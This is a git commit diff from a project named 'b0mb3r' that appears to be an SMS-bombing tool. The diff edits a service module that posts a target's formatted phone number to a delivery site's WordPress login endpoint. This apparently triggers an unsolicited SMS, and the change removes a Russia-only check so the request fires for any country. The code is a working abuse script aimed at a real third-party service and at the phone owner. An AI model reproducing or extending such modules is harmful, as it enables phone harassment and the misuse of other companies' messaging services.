12f9abf0d2309cd0eefb0524ea3072c0b9b39b91
spam-sms <54709225+spam-sms@users.noreply.github.com>
2019-11-30 16:35:31 +0300

    Update psdelivery.py

--- b0mb3r/services/psdelivery.py
+++ b0mb3r/services/psdelivery.py
@@ -3,7 +3,6 @@ from service import Service
 
 class Psdelivery(Service):
     async def run(self):
-        if self.country_code == 'ru':
-            phone = f'+{self.formatted_phone[0]} ({self.formatted_phone[1:4]}) {self.formatted_phone[4:7]}-{self.formatted_phone[7:9]}-{self.formatted_phone[9:11]}'
-            cookies = self.client.get('https://ps.delivery/').cookies
-            self.client.post('https://ps.delivery/wp-admin/admin-ajax.php', cookies=cookies, data={'tel': phone, 'redirect_to': '', 'rememberme': 'forever', 'undefined': '', 'action': 'login'})
+        phone = f'+{self.formatted_phone[0]} ({self.formatted_phone[1:4]}) {self.formatted_phone[4:7]}-{self.formatted_phone[7:9]}-{self.formatted_phone[9:11]}'
+        cookies = self.client.get('https://ps.delivery/').cookies
+        self.client.post('https://ps.delivery/wp-admin/admin-ajax.php', cookies=cookies, data={'tel': phone, 'redirect_to': '', 'rememberme': 'forever', 'undefined': '', 'action': 'login'})
